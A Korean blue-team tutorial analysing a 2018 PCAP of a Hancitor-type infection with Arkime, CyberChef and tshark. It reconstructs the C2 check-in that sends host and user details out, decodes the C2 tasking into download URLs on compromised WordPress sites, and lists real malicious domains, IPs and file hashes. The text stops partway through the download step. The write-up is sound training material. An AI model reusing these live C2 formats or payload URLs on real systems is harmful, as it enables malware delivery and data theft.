---
title: Night Dew — Hancitor 체크인에서 후속 다운로드, 정보 유출, 자체 서명 TLS C2까지 (Arkime + CyberChef + Snort)
tags:
  - blue-team
  - pcap
  - arkime
  - cyberchef
  - snort
  - c2
  - hancitor
  - tls
  - ticket
---

# Night Dew — Hancitor 체크인에서 후속 다운로드, 정보 유출, 자체 서명 TLS C2까지 { #night-dew }

!!! abstract "사례 요약"
    AD 도메인(NIGHTDEW)에 속한 **Windows 7 PC 한 대(CHICAGO-7FA3-PC, 사용자 faith.hoffman)**의 43분짜리 캡처입니다. 사용자가 로그인하고 **35초 뒤** PC가 `api.ipify[.]org`로 공인 IP를 확인했어요. 그리고 곧바로 `lysedsohap[.]com/4/forum.php`에 **자기 정보(컴퓨터 이름, 도메인\사용자, 공인 IP, OS)를 담은 POST**를 보냈습니다. 첫 응답을 **CyberChef(Base64 → XOR 0x7A)**로 풀면 "이 주소에서 파일을 받아라"라는 명령 3개가 나와요. PC는 1초 뒤 해킹된 WordPress 사이트 `wansaiful[.]com`에서 **암호화된 파일 3개**를 받았습니다. 3초 안에 **다른 프로그램이 암호화된 POST 2개**(비밀번호 유출로 추정)를 보냈고, 2분 뒤부터는 **자체 서명 인증서(`Default Company Ltd`)를 쓰는 TLS C2** `robwassotdint[.]ru`에 약 5분마다 접속했습니다. 전형적인 **Hancitor → Pony → Zeus Panda Banker** 감염 사슬과 같은 모양이에요. **Snort 룰 8개를 PCAP으로 테스트**하고, 하나로 합친 **티켓**을 완성합니다.

| | |
|---|---|
| **증거** | PCAP 1개 `2018-05-11-traffic-analysis-exercise.pcap` — 2018-05-11 02:06:51 – 02:49:40 UTC (42분 49초), 패킷 7,295개, SHA256 `b2c8d0fe…13e51e` |
| **출처** | malware-traffic-analysis.net 2018-05-11 실습 "Night Dew" |
| **환경** | 폐쇄망(VirusTotal, OSINT 불가). Arkime 웹 화면, CyberChef, 분석 VM의 tshark와 Snort 2.9 |
| **결과물** | 베이스라인, 악성 활동 분석, CyberChef 디코드, 트래픽을 다시 찾는 Snort 룰(테스트 완료), 침해사고 티켓 하나 |
| **관련 페이지** | [Arkime 검색 문법](../../network/arkime/search-syntax.md) · [비콘과 C2](../../network/beaconing-c2.md) · [PCAP 실습 06 — 같은 Hancitor 유형](pcap-lab-06-invoice-macro-c2.md) · [앞의 사례: Back to the Present](back-to-the-present-chthonic-c2-tech-support-scam.md) |

!!! tip "이 페이지 읽는 법"
    완전한 초보자도 첫 쿼리부터 티켓 완성까지 따라 할 수 있게 썼습니다. 단계마다 같은 순서로 설명합니다.

    1. **목적** — 이 단계에서 무엇을 알아내려는지
    2. **쿼리** — 코드 블록 오른쪽 위 **복사 버튼**으로 복사
    3. **해설** — 한 조각씩 무슨 뜻인지
    4. **결과** — 이 PCAP에서 실제로 나온 값
    5. **결과 읽기** — 그 값이 무슨 뜻이고 왜 중요한지
    6. **티켓 기록** — 이 단계의 작업 로그 한 줄

!!! note "결과 값은 어디서 왔나요?"
    1-1단계와 3-1단계의 SPIView 값(Dst IP, Protocols, Hostname, URI, Useragent 등)은 실제 Arkime 화면에서 확인한 값입니다. 나머지 값은 같은 PCAP을 **tshark**로 처리해서 확인했습니다. Arkime 버전에 따라 필드 이름(`cert.issuer.on`, `http.request.content-type` 등)이 조금 다를 수 있어요. 쿼리가 안 맞으면 SPIView에서 해당 값을 클릭하고 **and**를 고르면 그 버전에 맞는 식이 자동으로 들어갑니다.

!!! warning "이 페이지의 지표는 실제 값입니다"
    도메인, IP, 해시는 2018년의 실제 악성 트래픽에서 나온 값입니다. 본문과 표에서는 무력화(`hxxp`, `[.]`)해서 적었고, 코드 블록(쿼리, 룰, 원본 출력) 안에서는 입력한 그대로 두었습니다. **절대 접속하지 마세요.** 추출한 파일은 격리된 분석 VM 밖에서 절대 열지 마세요.

## 한눈에 보는 답 { #answers }

**결론:** 2018-05-11 02:08:04 UTC부터 CHICAGO-7FA3-PC(10.0.14.129, 사용자 faith.hoffman)가 Hancitor 유형 다운로더에 감염돼 있었습니다. 이 PC는 C2에 2분마다 체크인했고, 추가 악성코드 3개를 받았고, 비밀번호를 훔쳐 보낸 것으로 보이는 POST를 2번 보냈어요. 그 뒤 Zeus Panda Banker 유형의 HTTPS C2에 5분마다 접속했습니다.

| 항목 | 답 | 상태 |
|---|---|---|
| 감염 PC | **10.0.14.129 CHICAGO-7FA3-PC**, MAC `00:1a:92:06:5c:7b` (ASUSTek), Windows 7 64비트 (NT 6.1) | 확인됨 |
| 사용자 계정 | **faith.hoffman** (도메인 NIGHTDEW) | 확인됨 |
| 도메인 / DC | **nightdew.org**, DC = **10.0.14.3 Nightdew-DC** | 확인됨 |
| 게이트웨이 / DHCP | 10.0.14.1 (Cisco) | 확인됨 |
| 첫 악성 이벤트 | **02:08:04 UTC** `api.ipify[.]org`로 공인 IP 확인 → 바로 `lysedsohap[.]com` 체크인 | 확인됨 |
| 1차 C2 | `lysedsohap[.]com` **185.43.223.6:80**, POST `/4/forum.php` **21번** (약 2분 간격, 02:08:04–02:48:25) | 확인됨 |
| 후속 다운로드 | `wansaiful[.]com` **111.90.144.30:80**, 암호화된 파일 3개 (46,341 / 47,383 / 159,255바이트, 02:08:05–02:08:15) | 확인됨 |
| 정보 유출 | `lysedsohap[.]com` `/mlu/forum.php`(206 B), `/d2/about.php`(234 B) 암호화 POST 2번, 02:08:12–02:08:14 | 확인됨 (내용은 암호화) |
| 2차 C2 | `robwassotdint[.]ru` **185.174.175.14:443**, TLS 세션 **54개** (02:10:16–02:45:46), 자체 서명 인증서 `Default Company Ltd` | 확인됨 |
| 악성코드 계열 | Hancitor + Pony(정보 탈취) + Zeus Panda Banker 유형 | 추정 (공개 자료와 일치) |
| 최초 감염 경로 | PCAP 안에 메일이나 문서 다운로드가 없음 → 캡처 전에 감염됐거나, 로그인(02:07:29) 직후 문서를 열었을 가능성 | 미확인 |
| 측면 이동 | **없음** — DC와는 정상적인 도메인 통신(Kerberos, LDAP, SMB 정책 읽기)만 있음 | 확인됨 |
| Snort | 룰 8개 (sid 1000011–1000018), PCAP 테스트에서 모두 예상한 개수만큼 탐지 | 확인됨 |

---

## 0단계 — 준비: PCAP과 Arkime 시간 범위 { #prep }

**목적:** 무엇을 분석하는지 기록하고, Arkime가 PCAP 전체를 보여 주는지 확인합니다.

**과제 시나리오:** 2018-05-11(금, UTC)에 감염이 의심되는 Windows 호스트 알림이 왔고, 동료가 관련 트래픽을 가져왔습니다. 트래픽을 분석해서 인시던트 리포트(티켓)를 씁니다.

**PCAP 정보 (분석 VM에서 `capinfos`, `sha256sum`):**

```text
File        2018-05-11-traffic-analysis-exercise.pcap
SHA256      b2c8d0fed6765dc4d2036fae6587a3bac9c27184a3032bd3899eefac4d13e51e
Packets     7295
First       2018-05-11 02:06:51 UTC
Last        2018-05-11 02:49:40 UTC
Duration    약 42분 49초
```

- 해시는 "내가 분석한 파일이 바로 이 파일"이라는 증거예요. 티켓의 증거 위치와 함께 적어 두면 다음 사람이 같은 파일인지 확인할 수 있습니다.
- `capinfos`는 컴퓨터의 시간대로 시간을 보여 줄 수 있어요. `TZ=UTC capinfos 파일`처럼 앞에 `TZ=UTC`를 붙이면 UTC로 나옵니다. (애들레이드 시간으로 보면 11:36:51처럼 9시간 30분 늦게 나와요.)

**Arkime 시간 범위:**

```text
Start     2018/05/11 02:06:51
End       2018/05/11 02:50:00
Bounding  Last Packet
```

- **Start / End** — 검색할 시간 창입니다. 마지막 패킷은 02:49:40이에요. 끝을 **조금 넓게**(02:50:00) 잡으면 끝부분 세션을 놓치지 않습니다.
- **Bounding: Last Packet** — 세션의 **마지막 패킷** 시간이 창 안에 있으면 보여 줍니다. 시간을 넓게 잡으면 어떤 Bounding을 쓰든 전체가 나와요.
- Arkime의 시간은 UTC로 표시되게 두세요(Settings → Timezone Format → UTC). 티켓의 시간은 모두 UTC입니다.

**화면에서 보는 곳:**

| 탭 | 용도 |
|---|---|
| **Sessions** | 세션(연결) 하나가 한 줄. 줄을 펼치면 상세 정보와 패킷 내용이 보임 |
| **SPIView** | 필드별로 값과 개수를 모아 보여 줌. 값 옆 괄호 안 숫자 `(54)`는 **세션 개수** |
| **Connections** | 누가 누구와 통신했는지 그래프 |

값을 클릭하면 **and** / **exclude** 메뉴가 나와서 검색식에 바로 추가할 수 있어요. 검색식을 직접 치는 것보다 오타가 적습니다.

**티켓 기록:** 없음. 준비 단계는 악성 활동을 보여 주지 않으니까요. PCAP 해시는 분석 메모에만 남깁니다.

---

## 1단계 — 베이스라인: 어떤 장치와 사용자가 있나 { #baseline }

**결과:** 내부 PC는 10.0.14.129 한 대(CHICAGO-7FA3-PC, 사용자 faith.hoffman)뿐이고, 10.0.14.3은 도메인 컨트롤러(DC), 10.0.14.1은 게이트웨이입니다. 베이스라인을 먼저 알아야 나중에 "이상한 것"이 눈에 띄어요.

### 1-1. 전체 그림 보기 { #overview }

**쿼리:** 검색창을 **비우고** Search → **SPIView** → **general** 섹션.

**결과 (Arkime 화면):**

```text
Src IP     10.0.14.129 (212)  10.0.14.1 (3)  0.0.0.0 (1)
Dst IP     10.0.14.3 (91)  185.174.175.14 (54)  10.0.14.1 (23)  185.43.223.6 (23)
           224.0.0.252 (5)  255.255.255.255 (4)  10.0.14.129 (3)  10.0.14.255 (3)
           224.0.0.22 (3)  239.255.255.250 (3)  111.90.144.30 (1)  173.223.52.18 (1)
           184.72.249.110 (1)  216.58.193.68 (1)
Protocols  tcp (131) udp (82) tls (55) dns (34) http (26) krb5 (25) ldap (12)
           dhcp (9) dcerpc (7) smb (6) llmnr (5) igmp (3) ntp (3) ssdp (3)
```

**결과 읽기:**

- **세션을 시작한 내부 PC는 10.0.14.129 하나뿐입니다**(212개). 10.0.14.1의 3개는 DHCP 서버의 답이고, 0.0.0.0은 IP를 받기 전의 PC예요.
- **외부에서 먼저 들어온 연결은 없습니다.** Src IP에 외부 IP가 하나도 없어요.
- 외부 IP는 6개뿐입니다. 그중 185.174.175.14(54)와 185.43.223.6(23)이 유난히 많아서 눈에 띄어요. 일반 사용자가 42분 동안 같은 외부 IP에 수십 번 접속하는 건 흔하지 않습니다.
- `krb5`, `ldap`, `smb`, `dcerpc`가 있다는 건 **Windows 도메인(Active Directory) 환경**이라는 뜻이에요. 앞의 [Back to the Present](back-to-the-present-chthonic-c2-tech-support-scam.md)(공유기만 있던 집 PC)와 다릅니다.

### 1-2. 호스트 이름과 MAC (DHCP) { #dhcp }

**쿼리:**

```text
protocols == dhcp
```

- `protocols` — Arkime가 알아낸 프로토콜 목록입니다.
- `== dhcp` — DHCP 세션만 남깁니다.

→ **SPIView** → **dhcp** 섹션(안 보이면 오른쪽 위 **Load All**).

**결과 (패킷에 든 값):**

```text
Host        Chicago-7fa3-PC
Client MAC  00:1a:92:06:5c:7b
Client OUI  ASUSTek COMPUTER INC.
Type        REQUEST, INFORM, ACK
Vendor      MSFT 5.0
```

**결과 읽기:**

- **Host = Chicago-7fa3-PC** — PC가 IP를 요청하면서 스스로 밝힌 컴퓨터 이름입니다.
- **MAC = 00:1a:92:06:5c:7b, OUI = ASUSTek** — MAC은 네트워크 카드의 고유 번호예요. IP는 바뀔 수 있어도 MAC은 거의 안 바뀌니까, 호스트 오퍼레이터가 기계를 찾을 때 가장 확실한 단서입니다.
- **MSFT 5.0** — Windows(Vista 이후)의 DHCP 클라이언트가 붙이는 이름표예요.
- **02:06:51에 0.0.0.0에서 REQUEST** — PC가 켜지거나 네트워크에 다시 붙으면서 쓰던 IP(10.0.14.129)를 다시 요청했습니다. **캡처가 PC 시작 직후부터 기록됐다**는 뜻이라 중요해요([7단계 타임라인](#timeline)).
- **INFORM** — IP는 이미 있고 다른 설정만 묻는 메시지. **02:21:51, 02:36:51의 REQUEST**는 15분마다 하는 임대 갱신입니다. 모두 정상이에요.

### 1-3. 사용자 계정과 도메인 (Kerberos) { #kerberos }

**목적:** Windows 도메인에서는 로그인할 때 Kerberos로 DC에 "티켓"을 요청합니다. 이 요청에 **계정 이름**이 들어 있어요.

**쿼리:**

```text
protocols == krb5
```

→ **SPIView** → **krb5** 섹션.

**결과:**

```text
cname   CHICAGO-7FA3-PC$   chicago-7fa3-pc$   faith.hoffman
realm   NIGHTDEW.ORG
sname   krbtgt/NIGHTDEW.ORG   cifs/nightdew-dc.nightdew.org
        ldap/Nightdew-DC.nightdew.org   host/chicago-7fa3-pc.nightdew.org
```

- `cname` — 티켓을 요청한 **계정**. `realm` — **도메인**. `sname` — 접근하려는 **서비스**.

**결과 읽기:**

- **`$`로 끝나는 이름은 컴퓨터 계정**입니다(`CHICAGO-7FA3-PC$`). PC도 도메인에 로그인해요. 사람 계정과 헷갈리면 안 됩니다.
- **`$`가 없는 faith.hoffman이 사람(사용자) 계정**입니다. 세션을 펼쳐 보면 **02:07:29 UTC**에 티켓을 요청했어요. 이때 사용자가 로그인한 것입니다.
- **도메인 = NIGHTDEW.ORG**, DC 이름 = **Nightdew-DC.nightdew.org**.
- `cifs`(파일 공유), `ldap`(디렉터리 조회), `host`는 로그인하고 그룹 정책을 읽을 때 보통 나오는 서비스예요. SMB로 읽은 파일도 그룹 정책 파일(`sysvol\...\gpt.ini`) 하나뿐입니다. **정상적인 도메인 로그인**이에요.

### 1-4. DC 확인 (DNS) { #dc }

**쿼리:**

```text
protocols == dns
```

→ **SPIView** → **dns** 섹션의 **Host**(질문한 이름)와 **IP**(답), 그리고 general의 **Dst IP**.

**결과에서 볼 것:**

```text
Dst IP  10.0.14.3 (34)        ← DNS 질문을 받는 서버
Host    _ldap._tcp.dc._msdcs.nightdew.org   → 10.0.14.3
        nightdew-dc.nightdew.org            → 10.0.14.3
```

- `_ldap._tcp.dc._msdcs.<도메인>`은 Windows가 **"우리 도메인의 DC가 어디 있나요?"** 하고 묻는 이름입니다. 답이 10.0.14.3이니 **10.0.14.3 = DC**예요.
- DNS 서버도 10.0.14.3(DC)입니다. 도메인 환경에서는 보통 DC가 DNS를 겸해요.
- 이 PC가 DC 말고 다른 DNS 서버에 직접 묻는 일은 없었습니다. 앞 사례의 "외부 DNS에 TCP로 직접 질문" 같은 우회는 이번에는 **없습니다.**

### 베이스라인 정리 { #baseline-summary }

| IP | 이름 | MAC (제조사) | 역할 |
|---|---|---|---|
| 10.0.14.129 | CHICAGO-7FA3-PC | 00:1a:92:06:5c:7b (ASUSTek) | 사용자 PC, Windows 7 x64, faith.hoffman |
| 10.0.14.3 | Nightdew-DC.nightdew.org | 00:1e:4f:88:3f:a6 (Dell) | DC + DNS |
| 10.0.14.1 | — | 00:02:16:47:96:ef (Cisco) | 게이트웨이 + DHCP |

**티켓 기록:** 베이스라인은 악성 활동이 아니라서 작업 로그에는 안 적습니다. 대신 호스트 이름, MAC, 사용자는 티켓의 **IMPACTED INTERNAL MACHINES** 칸에 들어갑니다.

---

## 2단계 — 외부 목적지 정리: 밖으로 누구와 얼마나 통신했나 { #external }

**결과:** 외부 IP 6개 중 3개(185.43.223.6, 111.90.144.30, 185.174.175.14)가 수상하고, 1개(api.ipify[.]org)는 정상 서비스지만 악성코드가 썼습니다. 나머지 2개는 Windows와 구글의 정상 통신입니다.

**쿼리:**

```text
ip.src == 10.0.14.129 && ip.dst != [10.0.0.0/8, 224.0.0.0/4, 255.255.255.255]
```

- `ip.src == 10.0.14.129` — 감염 의심 PC가 **시작한** 세션만.
- `&&` — 그리고(AND). 양쪽 조건을 모두 만족해야 합니다.
- `ip.dst != [...]` — 목적지가 대괄호 안 목록에 **하나도 해당하지 않는** 세션만.
- `10.0.0.0/8` — 내부 주소 전체. `224.0.0.0/4` — 멀티캐스트(LLMNR, SSDP 등 동네 방송). `255.255.255.255` — 브로드캐스트. 이것들을 빼면 **인터넷으로 나간 것만** 남아요.

→ **Sessions** 탭에서 **Dst IP**로 정렬하거나, **SPIView**의 general(Dst IP), http(Hostname), tls 섹션을 함께 봅니다. 바이트는 Sessions 탭에 **Src Bytes / Dst Bytes** 열을 추가하면 보여요(열 제목 오른쪽 클릭 → 열 추가).

**결과 (정리):**

| Dst IP | 포트 | 이름 (DNS / Host / SNI) | 세션 | 처음 – 마지막 (UTC) | 보냄 / 받음 | 판단 |
|---|---|---|---|---|---|---|
| 185.174.175.14 | 443 | robwassotdint[.]ru | 54 | 02:10:16 – 02:45:46 | 약 120 KB / 1.65 MB | **악성** ([6단계](#tls-c2)) |
| 185.43.223.6 | 80 | lysedsohap[.]com | 23 | 02:08:04 – 02:48:25 | 약 16 KB / 12 KB | **악성** ([3단계](#checkin), [5단계](#exfil)) |
| 111.90.144.30 | 80 | wansaiful[.]com | 1 | 02:08:05 – 02:08:15 | 약 5 KB / 264 KB | **악성** ([4단계](#downloads)) |
| 184.72.249.110 | 80 | api.ipify[.]org | 1 | 02:08:04 | 0.5 KB / 0.5 KB | 정상 서비스, **악성코드가 사용** |
| 216.58.193.68 | 443 | www.google.com | 1 | 02:20:16 | 3.7 KB / 84 KB | 정상으로 보임 |
| 173.223.52.18 | 80 | www.msftncsi.com | 1 | 02:07:02 | 0.4 KB / 0.5 KB | 정상 (Windows 인터넷 연결 확인) |

**결과 읽기:**

- **185.174.175.14 — 세션 54개, 받은 양 1.65 MB.** 35분 동안 같은 서버에 계속 접속했어요. 이름 `robwassotdint[.]ru`는 의미 없는 글자 조합입니다.
- **185.43.223.6 — 세션 23개.** 40분 동안 꼬박꼬박 접속했고, `lysedsohap[.]com`도 무작위 같은 이름이에요. 보낸 양(16 KB)이 받은 양(12 KB)보다 많은 것도 일반 웹 서핑과 반대예요.
- **111.90.144.30 — 세션 1개에 264 KB를 받음.** 무언가를 내려받았습니다.
- **api.ipify[.]org** — "내 공인 IP가 뭐지?"를 알려 주는 정상 서비스예요. 그런데 회사 PC가 이걸 물어볼 일은 거의 없고, **악성코드가 감염 직후 자주 하는 행동**입니다. 시간을 보세요. 02:08:04에 ipify, 0.5초 뒤 lysedsohap[.]com, 1초 뒤 wansaiful[.]com이에요. 한 묶음입니다.
- **www.google.com** — 구글의 정상 인증서(Google Internet Authority G3)를 씁니다. 한 번뿐이라 판단할 근거가 부족해서, 티켓에는 넣지 않아요.
- **www.msftncsi.com/ncsi.txt** — Windows가 네트워크에 붙을 때 "인터넷 되나?" 확인하는 요청입니다. User-Agent가 `Microsoft NCSI`예요. 정상입니다.

!!! tip "\"수상한 외부 IP\" 빠르게 고르는 법"
    1. 세션 수가 많은데 목적지가 하나뿐인 곳 (비콘 후보)
    2. 도메인 이름이 무작위 글자 조합인 곳
    3. 세션 하나에 받은 양이 큰 곳 (다운로드)
    4. 서로 다른 외부 IP가 **몇 초 안에 연달아** 나오는 곳 (한 프로그램의 연속 동작)

**티켓 기록:** 아직 없음. 무엇을 했는지 내용을 보고 나서 씁니다(3~6단계).

---

## 3단계 — HTTP 체크인: lysedsohap[.]com에 무엇을 보냈나 { #checkin }

**결과:** PC는 `lysedsohap[.]com/4/forum.php`에 자기 정보(컴퓨터 이름, 도메인\사용자, 공인 IP, OS)를 담은 POST를 약 **2분마다 21번** 보냈습니다. 첫 답에는 "이 주소들에서 파일을 받아라"는 명령이 암호화돼 있었어요. 전형적인 **다운로더(Hancitor 유형) C2**입니다.

### 3-1. HTTP 전체 보기 { #http-overview }

**쿼리:**

```text
protocols == http
```

→ **SPIView** → **http** 섹션.

**결과 (Arkime 화면):**

```text
Hostname   lysedsohap.com (23)  api.ipify.org (1)  wansaiful.com (1)  www.msftncsi.com (1)
URI        lysedsohap.com/4/forum.php (21)  lysedsohap.com/mlu/forum.php (1)
           lysedsohap.com/d2/about.php (1)  api.ipify.org/ (1)
           wansaiful.com/wp-content/plugins/easy-media-download/1, /2, /3
           www.msftncsi.com/ncsi.txt (1)
Useragent  Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko (23)
           Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; ...) (2)
           Microsoft NCSI (1)
http.request.content-type   application/x-www-form-urlencoded (21)  application/octet-stream (2)
http.request.referer        No data for this field
http.response.server        nginx/1.10.2 (23)  Cowboy (1)  nginx (1)
```

**결과 읽기:**

- **HTTP 세션 26개 중 23개가 lysedsohap[.]com**입니다. 그중 21개가 같은 주소 `/4/forum.php`예요. 같은 주소에 같은 일을 반복하면 비콘(beacon)을 의심합니다.
- **Referer가 하나도 없습니다.** 사람이 브라우저에서 링크를 눌렀다면 보통 Referer(어느 페이지에서 왔는지)가 붙어요. 프로그램이 주소를 알고 **직접** 요청한 것입니다.
- **User-Agent가 IE11처럼 보여도 믿으면 안 돼요.** User-Agent는 프로그램이 마음대로 쓸 수 있는 글자입니다. 특히 `MSIE 7.0`(2개)은 2007년 브라우저라서, Windows 7 PC의 IE11과 같이 나오는 것 자체가 이상해요([5단계](#exfil)).
- **요청 본문 종류 두 가지** — `x-www-form-urlencoded`(21) = 이름=값 형태의 글자, `octet-stream`(2) = 글자가 아닌 바이너리. 두 가지를 따로 봅니다.

### 3-2. 첫 체크인 열어 보기 { #first-checkin }

**쿼리:**

```text
ip.src == 10.0.14.129 && host.http == lysedsohap.com && http.uri == *4/forum.php*
```

- `host.http` — HTTP 요청의 Host 이름.
- `http.uri == *4/forum.php*` — `*`는 "아무 글자나". URI에 `4/forum.php`가 들어 있는 것만. (Arkime는 URI 앞에 호스트 이름까지 붙여서 저장해요: `lysedsohap.com/4/forum.php`.)

→ **Sessions** 탭에서 21개가 나오면, **Start Time으로 정렬**해서 가장 위(02:08:04) 세션의 ⊕를 눌러 펼칩니다. 아래쪽 패킷 내용에서 **natural**(또는 ascii) 보기를 고릅니다.

**결과 (요청):**

```text
POST /4/forum.php HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Host: lysedsohap.com
Content-Length: 123
Cache-Control: no-cache

GUID=10412771973665002240&BUILD=09fhx05&INFO=CHICAGO-7FA3-PC @ NIGHTDEW\faith.hoffman&IP=173.236.56.182&TYPE=1&WIN=6.1(x64)
```

**본문을 하나씩 나눠 읽기:**

| 이름 | 값 | 뜻 |
|---|---|---|
| `GUID` | 10412771973665002240 | 감염된 PC마다 붙는 고유 번호. 공격자가 피해 PC를 구분하는 데 써요 |
| `BUILD` | 09fhx05 | 악성코드 빌드(캠페인) 이름 |
| `INFO` | CHICAGO-7FA3-PC @ NIGHTDEW\faith.hoffman | **컴퓨터 이름 @ 도메인\사용자** — 피해 호스트와 사용자를 트래픽만으로 확인해 줍니다 |
| `IP` | 173.236.56.182 | 바로 전 api.ipify[.]org가 알려 준 **공인 IP** (네트워크의 인터넷 쪽 주소) |
| `TYPE` | 1 | 악성코드 내부 값 |
| `WIN` | 6.1(x64) | Windows 버전 6.1 = **Windows 7, 64비트** |

- **api.ipify[.]org를 왜 불렀는지 여기서 밝혀져요.** ipify의 답(173.236.56.182)이 0.5초 뒤 C2로 그대로 전달됐습니다. 설명 없이 두 세션을 하나의 행동으로 묶을 수 있는 증거예요.
- **이 본문만으로도 악성 판단이 충분합니다.** 정상 프로그램은 도메인\사용자와 공인 IP를 무작위 이름의 외부 서버에 보내지 않아요.

### 3-3. 첫 응답을 CyberChef로 풀기 { #cyberchef }

**결과 (응답):**

```text
HTTP/1.1 200 OK
Server: nginx/1.10.2
Content-Type: text/html
Transfer-Encoding: chunked
X-Powered-By: PHP/5.4.45

59c
GKPTARZAEg4OCkBVVQ0bFAkbExwPFlQZFRdVDQpXGRUUDh8UDlUKFg8dExQJVR8bCQNXFx8e...
0
```

- `Transfer-Encoding: chunked` — 본문을 덩어리로 나눠 보내는 방식이에요. `59c`는 다음 덩어리 크기(16진수 0x59c = 1436바이트)이고, 마지막 `0`은 "끝"이라는 표시입니다. **본문이 아니니 복사할 때 빼세요.**
- 본문은 `A-Z a-z 0-9 + /`만 쓴 긴 글자예요. **Base64**로 보입니다.

**CyberChef 레시피:**

1. Input에 `59c`와 `0` 사이의 글자만 붙여 넣습니다. (패킷이 나뉘어 중간에 줄바꿈이 있으면 줄바꿈은 지워 주세요.)
2. **From Base64** — Base64를 원래 바이트로 되돌립니다. 결과는 아직 알아볼 수 없는 바이트예요.
3. **XOR** — Key `7a`, 형식 **HEX**. 모든 바이트를 0x7A와 XOR해서 원래 글자로 되돌립니다.

**결과 (CyberChef Output, 보기 좋게 줄바꿈):**

```text
b..{l:http://wansaiful.com/wp-content/plugins/easy-media-download/1
       |http://www.victoryoutreachvallejo.com/wp-content/plugins/regenerate-thumbnails/includes/1
       |http://medleysoup.com/wp-content/plugins/comicpress-manager/1
       |http://radiantheartcoaching.com/blog/wp-content/themes/twentyten/1
       |http://hdmicablereviews.com/wp-content/plugins/google-sitemap-generator/1}
    {b:http://wansaiful.com/wp-content/plugins/easy-media-download/2|... (같은 5개 사이트, /2)}
    {r:http://wansaiful.com/wp-content/plugins/easy-media-download/3|... (같은 5개 사이트, /3)}
```

**결과 읽기:**

- 맨 앞 몇 바이트(`b..`)는 의미 없는 값이고, 그 뒤가 **명령**입니다. `{글자:주소|주소|...}` 모양이 3개 있어요.
- 명령마다 **같은 파일을 가진 서버 5곳**을 줍니다. 첫 서버가 막히면 다음 서버를 쓰는 예비 목록이에요. 이 PC는 첫 번째인 **wansaiful[.]com에서 다 받아서** 나머지 4곳에는 접속하지 않았습니다. 나머지 4곳도 다른 네트워크에서 찾아볼 지표(IOC)로 적어 둡니다.
- 주소가 모두 **WordPress 플러그인/테마 폴더**(`wp-content/plugins/...`)예요. 해킹당한 정상 WordPress 사이트에 악성 파일을 숨겨 둔 전형적인 모양입니다.
- `l`, `b`, `r`은 "받은 파일을 어떻게 실행할지"를 정하는 명령 글자입니다. 공개 분석에 따르면 Hancitor는 이런 글자로 실행 방식(바로 실행, 다른 프로세스에 주입 등)을 고릅니다. 글자별 정확한 뜻은 호스트에서 확인해야 하므로 티켓에는 "3개의 다운로드 명령"까지만 씁니다.

**나중 응답들:** 02:10:15 이후 20번의 응답은 모두 12바이트입니다(예: `TGTGARRABw==`). 같은 레시피로 풀면 끝에 `{n:}`이 남아요. "새 명령 없음, 대기"라는 뜻입니다.

### 3-4. 비콘 간격 재기 { #beacon-interval }

→ 3-2의 쿼리 결과(21개)를 **Start Time**으로 정렬합니다.

```text
02:08:04  02:10:15  02:12:16  02:14:16  02:16:17  02:18:17  02:20:18
02:22:18  02:24:19  02:26:19  02:28:20  02:30:20  02:32:21  02:34:21
02:36:22  02:38:22  02:40:23  02:42:24  02:44:24  02:46:25  02:48:25
```

- 첫 체크인 뒤로 **정확히 약 120.5초 간격**입니다. 사람은 이렇게 규칙적으로 움직이지 않아요. 타이머로 도는 **자동 비콘**입니다.
- 본문은 매번 같고(123바이트, 같은 GUID) 응답은 `{n:}`이에요. **C2가 살아 있고 다음 명령을 기다리는 상태**로 캡처가 끝났습니다.

**티켓 기록 (3단계):**

```text
[2335 261119, Sung] – Investigating repeated HTTP POSTs from 10.0.14.129 to lysedsohap.com (185.43.223.6) for C2 – Found – Further Analysis Required

[2348 261119, Sung] – Decoding the first C2 response from lysedsohap.com for tasking – Found – Further Analysis Required
```

도구 출력(TOOL OUTPUT / ANALYST NOTES)은 [티켓](#ticket)에 있어요. 같은 `[시간, Sung]` 표시를 붙여서 Ctrl+F로 두 줄을 함께 찾을 수 있게 합니다.

---

## 4단계 — 후속 다운로드: wansaiful[.]com에서 받은 파일 3개 { #downloads }

**결과:** C2 명령을 받은 지 1초 뒤부터 PC는 `wansaiful[.]com`(111.90.144.30)에서 파일 3개를 받았습니다(02:08:05–02:08:15, 합계 252,979바이트). 파일은 `text/plain`으로 위장하고 암호화돼 있어서 EXE 모양이 보이지 않아요.

**쿼리:**

```text
ip.src == 10.0.14.129 && host.http == wansaiful.com
```

→ **세션이 1개**만 나옵니다. 펼쳐 보면 그 안에 **요청이 3개**예요(SPIView의 `URI Cnt 3 (1)`). 연결 하나를 열어 두고 여러 번 요청하는 **keep-alive** 방식이라서, 세션 수와 요청 수가 다를 수 있습니다.

**결과 (세션 상세, 요청·응답 3쌍):**

```text
02:08:05  GET /wp-content/plugins/easy-media-download/1   Host: wansaiful.com
          200  Content-Type: text/plain  Content-Length: 46341   Last-Modified: Thu, 10 May 2018 13:29:43 GMT
02:08:13  GET /wp-content/plugins/easy-media-download/2
          200  Content-Type: text/plain  Content-Length: 47383   Last-Modified: Thu, 10 May 2018 13:29:50 GMT
02:08:14  GET /wp-content/plugins/easy-media-download/3
          200  Content-Type: text/plain  Content-Length: 159255  Last-Modified: Thu, 10 May 2018 13:29:58 GMT
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko   Referer: (none)
Server: nginx
```

**파일 해시 (분석 VM에서 추출):**

```bash
tshark -r 2018-05-11-traffic-analysis-exercise.pcap --export-objects http,http_objects
sha256sum http_objects/1 http_objects/2 http_objects/3
file http_objects/1
```

- `--export-objects http,폴더` — HTTP로 오간 파일을 모두 폴더에 저장합니다. **절대 실행하지 마세요.**
- `sha256sum` — 파일의 SHA256 해시. `file` — 내용을 보고 파일 종류를 알려 줍니다.
- Arkime에서도 세션 상세의 **Body MD5**(요청마다)로 MD5를 볼 수 있고, 파일 다운로드 링크도 있어요.

```text
파일  크기(B)  MD5                               SHA256
/1    46341   ae9dfd2190b07927078cb4a19d0b2187  e1011c8688b88154d7c942895bd5a00abff857677581b638651a84d5eb77df45
/2    47383   74eb0ec9c04ddf315053773aba5bcb01  a19b56853afe9d6ba3d3b897b54dd3eee68730e630b48d7aae587a01bf5ffc74
/3    159255  b799ac083efb27e51c46ea1542f89b12  97ca86f8d6c62efb24219db591b7a97e261f25a40c5d9d92329d7e0d9ff8e4d9

